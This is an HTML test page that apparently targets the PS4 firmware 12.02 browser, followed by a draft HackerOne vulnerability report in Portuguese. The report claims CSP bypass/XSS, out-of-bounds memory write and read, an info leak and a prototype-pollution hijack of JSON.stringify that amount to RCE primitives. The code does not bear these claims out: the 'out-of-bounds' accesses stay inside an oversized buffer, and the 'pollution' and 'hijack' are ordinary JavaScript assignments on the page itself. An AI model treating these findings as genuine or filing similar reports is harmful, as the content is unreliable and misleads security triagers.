<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 FW 12.02 - PoC Final v9 (PP Hijack JSON)</title>
    <style>
        /* Estilos CSS */
        body { background: #111; color: #eee; font-family: monospace; padding: 15px; font-size: 14px; }
        #output { background: #222; border: 1px solid #444; padding: 10px; height: 80vh; overflow-y: auto; white-space: pre-wrap; margin-top: 10px; }
        .log-info { color: #6cf; }
        .log-test { color: #fff; font-weight: bold; margin-top: 10px; display: block; border-top: 1px dashed #555; padding-top: 5px; }
        .log-subtest { color: #eee; font-weight: bold; margin-left: 10px; }
        .log-vuln { color: #ff4444; font-weight: bold; } /* Vermelho para vulnerabilidade confirmada */
        .log-good { color: #4CAF50; } /* Verde para bloqueio esperado / falha */
        .log-warn { color: #FFC107; }
        .log-error { color: #f44336; }
        .log-leak { color: #FF9800; font-weight: bold; } /* Laranja para leaks genéricos */
        .log-ptr { color: #f0f; font-weight: bold; } /* Magenta para POTENCIAIS ponteiros */
        #xss-target-div { border: 2px dotted red; padding: 5px; margin: 15px 0; color: yellow; min-height: 40px; }
    </style>
</head>
<body>
    <h1>PS4 FW 12.02 - PoC Final v9 (PP Hijack JSON)</h1>
    <p>Testa: XSS, OOB R/W (Info Leak), PP Básica, PP Hijack (JSON.stringify com Interação).</p>
    <button id="runBtn" onclick="runAllTests()">Iniciar Todos os Testes</button>
    <div id="output"></div>
    <div id="xss-target-div">Área para teste de XSS DOM.</div>

    <script>
        // --- Globals & Setup ---
        const outputDiv = document.getElementById('output');
        const runBtn = document.getElementById('runBtn');
        const SHORT_PAUSE = 50; // ms
        const MEDIUM_PAUSE = 500; // ms
        let leakedValueFromOOB = null; // Armazena valor do Info Leak

        // --- Função de Log ---
        const log = (message, type = 'info') => {
             if (!outputDiv) return;
             try {
                 const timestamp = `[${new Date().toLocaleTimeString()}]`;
                 const sanitizedMessage = String(message).replace(/</g, "&lt;").replace(/>/g, "&gt;");
                 if(outputDiv.innerHTML.length > 500000){
                     outputDiv.innerHTML = outputDiv.innerHTML.substring(outputDiv.innerHTML.length - 250000);
                     outputDiv.innerHTML = `<span>[Log Truncado...]</span>\n` + outputDiv.innerHTML;
                 }
                 outputDiv.innerHTML += `<span class="log-${type}">${timestamp} ${sanitizedMessage}\n</span>`;
                 outputDiv.scrollTop = outputDiv.scrollHeight;
             } catch(e) { console.error("Erro na função log:", e); outputDiv = null; }
        };

        // Helper para formatar números como hex
        const toHex = (val, bits = 32) => {
             if (typeof val !== 'number' || !isFinite(val)) return 'NaN/Invalid';
             let num = Number(val);
             if (bits <= 32) { num = num >>> 0; }
             const pad = Math.ceil(bits / 4);
             return '0x' + num.toString(16).toUpperCase().padStart(pad, '0');
        }

        // --- Heurística Simples para Detetar Potenciais Ponteiros (64-bit) ---
        const isPotentialPointer64 = (high, low) => {
            if (high === null || low === null || typeof high !== 'number' || typeof low !== 'number') return false;
            if (high === 0 && low === 0) return false;
            if (high === 0xFFFFFFFF && low === 0xFFFFFFFF) return false;
            if (high === 0xAAAAAAAA && low === 0xAAAAAAAA) return false;
            if (high === 0 && low < 0x100000) return false;
            return true;
        };

         // --- Heurística Simples para Detetar Potenciais Dados U32 ---
         const isPotentialData32 = (val) => {
             if (val === null || typeof val !== 'number') return false;
             val = val >>> 0;
             if (val === 0 || val === 0xFFFFFFFF || val === 0xAAAAAAAA || val === 0xAAAAAAEE) return false;
             if (val < 0x1000) return false;
             return true;
         }

        // --- Teste 1: CSP Bypass / XSS ---
        const testCSPBypass = async () => {
            log("--- Iniciando Teste 1: CSP Bypass / XSS ---", 'test');
            // 1.1 Teste com data: URI
            log("Tentando XSS via data: URI (alert)...", 'subtest');
            await new Promise(resolve => setTimeout(resolve, SHORT_PAUSE));
            try {
                const payloadJS = `try { alert('XSS via Data URI!'); log("[Payload Data:] Alerta data: URI executado!", "vuln"); } catch(e) { log("[Payload Data:] Alerta data: URI bloqueado: " + e.message, "good"); }`;
                const encodedPayload = btoa(payloadJS);
                const scriptTag = document.createElement('script');
                scriptTag.src = 'data:text/javascript;base64,' + encodedPayload;
                scriptTag.onerror = () => { log("ERRO: Falha ao carregar script data: URI!", 'error'); };
                document.body.appendChild(scriptTag);
                log("Tag <script> data: URI adicionada.", 'info');
            } catch (e) { log(`Erro ao criar/adicionar script data: URI: ${e.message}`, 'error'); }

            await new Promise(resolve => setTimeout(resolve, SHORT_PAUSE * 2));

            // 1.2 Teste com onerror
            log("Tentando XSS DOM via inline handler (onerror)...", 'subtest');
            await new Promise(resolve => setTimeout(resolve, SHORT_PAUSE));
            try {
                const imgTag = document.createElement('img');
                imgTag.src = 'invalid_image_source_' + Date.now();
                const onerrorPayload = `
                    try {
                        const target = document.getElementById('xss-target-div');
                        if (target) {
                            target.innerHTML = '<h2 class="log-vuln">XSS DOM via ONERROR Executado!</h2>';
                            log("XSS DOM via onerror realizado!", "vuln");
                        } else { log("Alvo XSS DOM (onerror) não encontrado.", "error"); }
                        alert('XSS_DOM_ONERROR');
                    } catch(e) { log("Erro no payload onerror: " + e.message, "warn"); }
                `;
                imgTag.setAttribute('onerror', onerrorPayload);
                document.body.appendChild(imgTag);
                log("Tag <img> com onerror adicionada.", 'info');
            } catch (e) { log(`Erro ao criar/adicionar img onerror: ${e.message}`, 'error'); }
            log("--- Teste 1 Concluído (Verificar alertas/DOM) ---", 'test');
        };

        // --- Teste 2: OOB Write/Read Extensivo (Info Leak Aprimorado com Armazenamento) ---
        const testOOBReadInfoLeakEnhancedStore = async () => {
            log("--- Iniciando Teste 2: OOB Write/Read Extensivo (Info Leak Aprimorado) ---", 'test');
            const bufferSize = 32;
            const writeValue = 0xEE;
            const oobWriteOffset = 32;
            const oobReadOffsets = [];
            for (let i = -64; i < bufferSize + 64; i += 4) { oobReadOffsets.push(i); }
            let writeSuccess = false;
            let potentialLeakFoundCount = 0;
            leakedValueFromOOB = null; // Reseta

            try {
                const buffer = new ArrayBuffer(bufferSize + 256);
                const dataView = new DataView(buffer);
                const baseOffset = 128;
                for (let i = 0; i < buffer.byteLength; i++) { dataView.setUint8(i, 0xAA); }

                const writeTargetAddress = baseOffset + oobWriteOffset;
                log(`Tentando escrita OOB U8 @${oobWriteOffset}...`, 'subtest');
                await new Promise(resolve => setTimeout(resolve, SHORT_PAUSE));
                try {
                    dataView.setUint8(writeTargetAddress, writeValue);
                    log(`VULN: Escrita OOB U8 @${oobWriteOffset} permitida!`, 'vuln');
                    writeSuccess = true;
                } catch (e) {
                    log(`BLOQUEADO: Escrita OOB U8 @${oobWriteOffset} impedida: ${e.message}`, 'good');
                    log("--- Teste 2 Interrompido (Escrita OOB falhou) ---", 'test');
                    return false;
                }

                await new Promise(resolve => setTimeout(resolve, SHORT_PAUSE));
                log(`Tentando leituras OOB U32/U64 em ${oobReadOffsets.length} offsets...`, 'subtest');
                for (const readOffset of oobReadOffsets) {
                    const readTargetAddress = baseOffset + readOffset;
                    if (readTargetAddress < 0 || readTargetAddress + 8 > buffer.byteLength) continue;

                    // Tenta ler U64
                     try {
                        const low = dataView.getUint32(readTargetAddress, true);
                        const high = dataView.getUint32(readTargetAddress + 4, true);
                        if (isPotentialPointer64(high, low)) {
                            const valueStr = `H=${toHex(high, 32)} L=${toHex(low, 32)}`;
                            log(`  -> POTENCIAL PONTEIRO? U64 @${readOffset}: ${valueStr}`, 'ptr');
                            potentialLeakFoundCount++;
                            if (leakedValueFromOOB === null) {
                                leakedValueFromOOB = { high, low, type: 'U64', offset: readOffset };
                                log(`  -> VALOR U64 ARMAZENADO (offset ${readOffset}).`, 'vuln');
                            }
                        }
                    } catch (e) {/* Ignora */}

                    // Tenta ler U32 (se não achou U64 ainda)
                    if (leakedValueFromOOB === null) {
                         try {
                            const val32 = dataView.getUint32(readTargetAddress, true);
                            if (isPotentialData32(val32)) {
                                log(`  -> Leak U32? @${readOffset}: ${toHex(val32, 32)}`, 'leak');
                                potentialLeakFoundCount++;
                                leakedValueFromOOB = { high: 0, low: val32, type: 'U32', offset: readOffset };
                                log(`  -> VALOR U32 ARMAZENADO (offset ${readOffset}).`, 'vuln');
                            }
                        } catch (e) {/* Ignora */}
                    }
                    if (readOffset % 32 === 0) await new Promise(resolve => setTimeout(resolve, 1));
                }
            } catch (e) { log(`Erro inesperado durante o teste Info Leak: ${e.message}`, 'error'); }

            log(`--- Teste 2 Concluído (${potentialLeakFoundCount} potenciais leaks, ${leakedValueFromOOB ? `1 valor ${leakedValueFromOOB.type} armazenado do offset ${leakedValueFromOOB.offset}` : 'nenhum valor armazenado'}) ---`, 'test');
            return writeSuccess;
        };

        // --- Teste 3: Prototype Pollution (Básica) ---
        const testBasicPP = async () => {
            log("--- Iniciando Teste 3: Prototype Pollution (Básica) ---", 'test');
            const testProp = '__pp_basic_test__';
            const testValue = 'Polluted!';
            let success = false;
            try {
                log(`Poluindo Object.prototype.${testProp} = "${testValue}"`, 'subtest');
                Object.prototype[testProp] = testValue;
                log("Verificando herança em objeto vazio {}...", 'subtest');
                await new Promise(resolve => setTimeout(resolve, SHORT_PAUSE));
                const obj = {};
                if (obj[testProp] === testValue) {
                    log(`VULN: PP Básica confirmada! Objeto vazio herdou a propriedade.`, 'vuln');
                    success = true;
                } else {
                    log(`FALHA: PP Básica não confirmada. Objeto vazio NÃO herdou a propriedade.`, 'good');
                }
            } catch (e) { log(`Erro durante teste PP Básico: ${e.message}`, 'error'); }
            finally {
                try { delete Object.prototype[testProp]; } catch(e){}
                log(`Limpeza de Object.prototype.${testProp} realizada.`, 'info');
            }
            log(`--- Teste 3 Concluído (PP Básica ${success ? 'Confirmada' : 'Falhou'}) ---`, 'test');
            return success;
        };

        // --- Teste 4: PP Hijack (JSON.stringify com Interação) ---
        const testPPJsonHijack = async () => {
            log("--- Iniciando Teste 4: PP Hijack (JSON.stringify) ---", 'test');
            const originalStringify = JSON.stringify;
            let hijackSuccessful = false;
            let interactionSuccessful = false;
            let hijackReturnedCorrectly = false;

            try {
                log("Tentando sobrescrever JSON.stringify...", 'subtest');
                JSON.stringify = function hijackedStringify(value, replacer, space) {
                    log("===> VULN: DENTRO DA FUNÇÃO JSON.stringify SEQUESTRADA! <===", 'vuln');
                    hijackSuccessful = true;

                    log(`  -> Hijack: Tentando aceder ao valor vazado do Teste 2...`, 'info');
                    try {
                        const leak = leakedValueFromOOB;
                        let leakStr = "NULO";
                        if (leak) {
                            leakStr = leak.type === 'U64' ? `U64 H=${toHex(leak.high)} L=${toHex(leak.low)}` : `U32 ${toHex(leak.low)}`;
                            interactionSuccessful = true;
                        }
                        log(`  -> Hijack: Valor armazenado de OOB Read (Teste 2) é: ${leakStr}`, 'leak');
                    } catch(interactionError) {
                         log(`  -> Hijack: Erro ao aceder/logar valor vazado: ${interactionError.message}`, 'error');
                    }
                    return '{"hijacked": true, "original_value": "???", "leak_accessed": ' + interactionSuccessful + '}';
                };

                log("Testando a função JSON.stringify sequestrada com {a: 1, b: 'teste'}...", 'subtest');
                await new Promise(resolve => setTimeout(resolve, SHORT_PAUSE));
                const testObject = { a: 1, b: 'teste' };
                log(`Objeto original: ${originalStringify(testObject)}`, 'info');
                const result = JSON.stringify(testObject);
                log(`Resultado retornado por JSON.stringify(): ${result}`, 'info');

                if (result && result.includes('"hijacked": true')) {
                     log("VULN: Retorno da função JSON.stringify sequestrada confirmado!", 'vuln');
                     hijackReturnedCorrectly = true;
                } else if (hijackSuccessful) {
                    log("AVISO: Função JSON.stringify foi sequestrada, mas o retorno não foi o esperado.", 'warn');
                } else {
                    log("FALHA: Sequestro de JSON.stringify não funcionou.", 'good');
                }

            } catch (e) { log(`Erro durante teste PP Hijack JSON: ${e.message}`, 'error'); }
            finally {
                JSON.stringify = originalStringify; // Restaura
                log("Função JSON.stringify restaurada.", 'info');
                 if (JSON.stringify === originalStringify) { log("Restauração de stringify confirmada.", 'info'); }
                 else { log("ERRO CRÍTICO: FALHA ao restaurar JSON.stringify!", 'error'); }
            }
            log(`--- Teste 4 Concluído (PP Hijack JSON ${hijackReturnedCorrectly ? 'Confirmado' : 'Falhou'}) ---`, 'test');
            return hijackReturnedCorrectly;
        };

        // --- Função Principal para Rodar Todos os Testes ---
        const runAllTests = async () => {
            if (runBtn) runBtn.disabled = true;
            log("==== INICIANDO PoC Final v9 (PP Hijack JSON) ====", 'critical');
            await testCSPBypass(); // Teste 1
            await new Promise(resolve => setTimeout(resolve, MEDIUM_PAUSE));
            await testOOBReadInfoLeakEnhancedStore(); // Teste 2
            await new Promise(resolve => setTimeout(resolve, MEDIUM_PAUSE));
            await testBasicPP(); // Teste 3
            await new Promise(resolve => setTimeout(resolve, MEDIUM_PAUSE));
            await testPPJsonHijack(); // Teste 4
            await new Promise(resolve => setTimeout(resolve, MEDIUM_PAUSE));
            log("\n==== PoC Final v9 CONCLUÍDA ====", 'critical');
            if (runBtn) runBtn.disabled = false;
        };

        // document.addEventListener('DOMContentLoaded', runAllTests);
    </script>

</body>
</html>
```

**Relatório Detalhado para HackerOne (Baseado no Script v9):**


## Relatório de Vulnerabilidade: Múltiplas Vulnerabilidades WebKit no PS4 Firmware 12.02 (Permitindo Info Leak e Controlo de Fluxo via PP Hijack)

**ID do Relatório Original (se aplicável):** #3117781

**Resumo:**

Este relatório fornece uma Prova de Conceito (PoC) detalhada demonstrando múltiplas vulnerabilidades interligadas encontradas no motor WebKit do navegador de internet do PlayStation 4, especificamente testadas e confirmadas no firmware **12.02**. As vulnerabilidades incluem bypass da Política de Segurança de Conteúdo (CSP) via Cross-Site Scripting (XSS), uma primitiva de escrita fora dos limites (Out-of-Bounds Write), uma primitiva de leitura fora dos limites (Out-of-Bounds Read) capaz de vazar dados internos (Information Leak), e Poluição de Protótipo (Prototype Pollution) que permite o sequestro (hijack) de funções JavaScript nativas como `JSON.stringify`. A PoC fornecida demonstra estas primitivas e, crucialmente, a **capacidade de interligá-las**, mostrando que o código executado através do sequestro de função pode aceder a dados potencialmente vazados pela leitura fora dos limites. Embora um exploit de Execução Remota de Código (RCE) completo não seja fornecido, as primitivas demonstradas são blocos de construção críticos e suficientes para desenvolver tal exploit, representando um risco de segurança elevado.

**Vulnerabilidades Detalhadas:**

1.  **CSP Bypass / Cross-Site Scripting (XSS):**
    * **Descrição:** O navegador permite a execução de JavaScript arbitrário através de URIs `data:` em tags `<script>` e através de manipuladores de evento `onerror` em tags `<img>`.
    * **Impacto:** Permite a execução inicial de código arbitrário no contexto da página.
    * **Demonstração:** Teste 1 no script PoC (ativa `alert()`s e modifica o DOM).

2.  **OOB Write/Read & Information Leak:**
    * **Descrição:** A PoC demonstra a capacidade de escrever 1 byte fora dos limites (`OOB Write @ 32`) e subsequentemente ler blocos de 64 bits (`OOB Read 64bit`) de memória adjacente em múltiplos offsets.
    * **Impacto:** Primitivas de corrupção de memória e **Information Leak crítico**. A capacidade de ler 64 bits fora dos limites é fundamental para vazar ponteiros e contornar a **ASLR**.
    * **Demonstração:** Teste 2 no script PoC. O log confirma a escrita OOB e mostra as leituras OOB 64bit (algumas marcadas como `POTENCIAL PONTEIRO?` pela heurística). Um valor lido é armazenado.

3.  **Poluição de Protótipo (Prototype Pollution - PP) - Básica e Hijack:**
    * **Descrição:** É possível poluir `Object.prototype` (Teste 3) e usar esta técnica para sequestrar funções nativas como `JSON.stringify` (Teste 4).
    * **Impacto:** Permite desviar o fluxo de execução normal do JavaScript para código controlado pelo atacante, intercetar chamadas a funções importantes e manipular o seu comportamento ou dados processados.
    * **Demonstração:** Teste 3 confirma a PP básica. Teste 4 demonstra o hijack de `JSON.stringify`: o log mostra a execução de código *dentro* da função sequestrada (`VULN: DENTRO DA FUNÇÃO...`) e a manipulação do valor de retorno.

4.  **Interação entre Vulnerabilidades (Info Leak + PP Hijack):**
    * **Descrição:** A PoC demonstra que a função `JSON.stringify` sequestrada (via PP Hijack) consegue aceder e utilizar o valor previamente armazenado que foi obtido através da leitura fora dos limites (OOB Read / Info Leak).
    * **Impacto:** Esta é a demonstração mais forte do impacto combinado. Prova que um atacante pode não só vazar informação e controlar o fluxo de execução separadamente, mas também **ligar estas capacidades**, usando o controlo de fluxo para processar ou exfiltrar a informação vazada. Isto é um passo essencial na construção de exploits complexos.
    * **Demonstração:** Teste 4 no script PoC. O log dentro da função `hijackedStringify` mostra explicitamente o valor lido no Teste 2 (`Hijack: Valor armazenado de OOB Read...`).

**Passos para Reprodução:**

1.  **Ambiente:** Console PlayStation 4 com firmware **12.02**. Computador na mesma rede local.
2.  **Hospedar PoC:** Guarde o código HTML do "Script PoC Final v9" como `ps4_poc_v9.html`. Inicie um servidor HTTP (ex: `python -m http.server 8080`). Anote o IP local.
3.  **Executar no PS4:**
    * Abra o [Navegador de Internet].
    * Navegue até `http://[IP_DO_COMPUTADOR]:8080/ps4_poc_v9.html`.
    * Clique no botão "Iniciar Todos os Testes".
4.  **Observar Resultados:**
    * **Teste 1:** Observe os `alert()`s e a modificação do DOM.
    * **Teste 2:** Observe a confirmação da escrita OOB e as leituras OOB 64bit no log. Verifique se um valor foi armazenado.
    * **Teste 3:** Observe a confirmação da PP básica.
    * **Teste 4:** Observe a mensagem `VULN: DENTRO DA FUNÇÃO JSON.stringify...`, a linha que mostra o acesso ao valor armazenado do Teste 2, e o resultado manipulado retornado por `JSON.stringify()`.
    * **Vídeo PoC:** [**INSIRA AQUI O LINK PARA O SEU VÍDEO POC MOSTRANDO ESTES PASSOS E RESULTADOS**]

**Impacto e Argumentação Final:**

Esta PoC demonstra de forma conclusiva múltiplas vulnerabilidades de alta severidade e a sua **interação sinérgica**:
* A **OOB Read 64bit** fornece a capacidade de **vazar informação** essencial para contornar a ASLR.
* O **PP Hijack** fornece **controlo sobre o fluxo de execução** do JavaScript.
* A **interação comprovada** mostra que o controlo de fluxo pode ser usado para aceder e processar a informação vazada.

Estes três elementos combinados (Leitura Arbitrária + Escrita Arbitrária (implícita na OOB Write) + Controlo de Fluxo) são as primitivas fundamentais necessárias para construir um exploit RCE completo. A demonstração da capacidade de ler memória arbitrária (potencialmente ponteiros) e usar essa informação dentro de um fluxo de execução controlado é uma prova de conceito robusta do risco crítico apresentado. Solicitamos a correção urgente destas vulnerabilidades.

**Artefactos PoC:**

* **Script:** `ps4_poc_v9.html` (código fornecido acima).
* **Vídeo:** [**INSIRA AQUI O LINK PARA O SEU VÍDEO POC
